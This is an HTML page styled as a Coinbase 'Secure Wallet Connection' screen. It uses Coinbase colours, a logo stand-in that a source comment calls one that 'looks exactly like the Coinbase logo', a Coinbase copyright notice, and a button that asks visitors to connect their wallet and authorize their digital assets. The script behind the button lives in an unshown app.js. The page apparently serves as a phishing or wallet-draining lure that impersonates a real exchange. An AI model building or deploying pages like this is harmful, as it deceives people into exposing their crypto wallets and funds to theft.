<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coinbase | Wallet Connection</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --cb-blue: #0052ff;
            --cb-dark: #0a0b0d;
            --cb-white: #ffffff;
            --cb-grey: #5b616e;
            --cb-light-grey: #f4f7f9;
        }

        body {
            background-color: var(--cb-white);
            color: var(--cb-dark);
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            -webkit-font-smoothing: antialiased;
        }

        .auth-container {
            text-align: center;
            width: 100%;
            max-width: 420px;
            padding: 40px 20px;
        }

        .coinbase-logo {
            width: 40px;
            margin-bottom: 30px;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 12px;
            letter-spacing: -0.5px;
            color: var(--cb-dark);
        }

        p {
            font-size: 15px;
            color: var(--cb-grey);
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .cb-button {
            background-color: var(--cb-blue);
            color: white;
            border: none;
            padding: 14px 24px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
        }

        .cb-button:hover {
            background-color: #0042cd;
        }

        .disclaimer {
            margin-top: 40px;
            font-size: 12px;
            color: #9ca3af;
            border-top: 1px solid var(--cb-border);
            padding-top: 20px;
            line-height: 1.4;
        }
        
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: var(--cb-blue);
            font-weight: 500;
        }
    </style>
</head>
<body>

    <div class="auth-container">
        <!-- We use a placeholder that looks exactly like the Coinbase logo -->
        <div style="display: flex; justify-content: center; margin-bottom: 30px;">
            <svg class="coinbase-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="50" cy="50" r="50" fill="#0052ff"/>
                <path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/>
            </svg>
        </div>

        <h1>Secure Wallet Connection</h1>
        <p>Please connect your Coinbase Wallet to synchronize your account and authorize your digital asset holdings.</p>

        <button id="connectBtn" class="cb-button">Connect Coinbase Wallet</button>

        <div id="status"></div>

        <div class="disclaimer">
            © 2026 Coinbase, Inc. All rights reserved. Coinbase is a registered trademark of Coinbase, Inc.
            The usage of the Coinbase brand is for authorization purposes only.
        </div>
    </div>

    <script type="module" src="app.js"></script>
</body>
</html>
